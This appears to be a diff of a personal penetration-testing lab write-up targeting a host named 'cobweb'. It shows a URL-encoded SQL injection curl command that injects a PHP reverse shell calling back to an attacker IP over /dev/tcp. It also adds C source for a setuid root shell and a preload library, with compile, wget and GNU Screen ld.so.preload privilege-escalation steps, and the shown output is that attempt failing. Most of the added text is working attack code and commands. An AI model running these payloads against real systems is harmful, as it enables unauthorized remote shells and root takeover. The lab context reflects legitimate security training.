@@ -354,7 +354,7 @@ nc -nvlp 135
 # " AND 1=2 UNION SELECT 'echo shell_exec("sh -i >& /dev/tcp/192.168.49.53/135 0>&1");'-- 
 
 # urlencoded
-curl "http://cobweb/%22%20AND%201%3D2%20UNION%20SELECT+%27echo%20shell_exec%28%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.55%2F135%200%3E%261%22%29%3B%27--%20"
+curl "http://cobweb/%22%20AND%201%3D2%20UNION%20SELECT+%27echo%20shell_exec%28%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.53%2F135%200%3E%261%22%29%3B%27--%20"
 ```
 
 ![](Pasted%20image%2020260425162801.png)
@@ -457,7 +457,7 @@ searchsploit --path 41154
 cp /usr/share/exploitdb/exploits/linux/local/41154.sh ./
 python3 -m http.server 80
 
-ip a | grep 192 # 192.168.49.55
+ip a | grep 192 # 192.168.49.53
 
 # on victim
 cd /dev/shm
@@ -467,4 +467,80 @@ bash 41154.sh
 # failure - no cc 
 ```
 
-Okay. Screw this lab. I've wasted 2 whole days on this. I'm giving up and moving on.
+Okay. Let's try compiling it locally.
+
+```c
+//libhax.c:
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+```
+
+```c
+//rootshell.c:
+#include <stdio.h>
+#include <sys/stat.h>
+#include <sys/types.h> // Good practice to include this too
+#include <unistd.h>
+
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL);
+}
+```
+
+Compile on attacker:
+
+```sh
+#!/usr/bin/env bash
+# compile-hax.sh
+
+gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c
+
+gcc -o ./rootshell ./rootshell.c
+```
+
+Start a webserver.
+
+```sh
+python3 -m http.server 80
+```
+
+On the victim:
+
+```sh
+
+cd /tmp/
+wget http://192.168.49.53:80/rootshell
+wget http://192.168.49.53:80/libhax.so
+
+
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /tmp
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell
+
+```
+
+Dang it. It fails:
+
+```
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '/tmp/libhax.so' from /etc/ld.so.preload cannot be preloaded (failed to map segment from shared object): ignored.
+
+```
